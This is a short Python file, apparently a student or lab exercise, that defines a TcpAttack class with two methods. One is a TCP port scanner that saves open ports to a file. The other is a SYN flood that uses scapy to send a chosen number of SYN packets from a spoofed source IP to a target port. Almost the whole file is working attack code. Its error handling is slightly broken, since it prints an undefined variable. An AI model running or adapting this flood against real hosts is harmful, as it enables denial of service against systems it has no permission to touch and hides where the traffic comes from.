from scapy.all import *
import socket

class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    

    def scanTarget(self, rangeStart, rangeEnd):
        OUTPUT_FILE = open('openports.txt', 'w')
        print("------------Scanning Target Ports----------------------")
        verbosity = 0
        open_ports = []
        for testport in range(rangeStart, rangeEnd + 1):
            # print("Testing port ", testport)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                # print("made it here")
                sock.connect((self.targetIP, testport))
                # print(self.targetIP)
                open_ports.append(testport)
                if verbosity: 
                    print("Port opened: ", testport)

            except:
                if verbosity: 
                    print("Port closed: ", testport)

        for port in open_ports:
            OUTPUT_FILE.write(str(port) + "\n")
        
        OUTPUT_FILE.close()

    def attackTarget(self, port, numSyn):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        try:
            for i in range(numSyn):
                IP_header = scapy.all.IP(src=self.spoofIP, dst=self.targetIP)
                TCP_header = scapy.all.TCP(flags='S', sport=RandShort(), dport=int(port))
                packet = IP_header / TCP_header
                try:
                    send(packet)
                except Exception as error:
                    print(error)
        except:
            print("attack failed :(")
            print(error)

        
    
    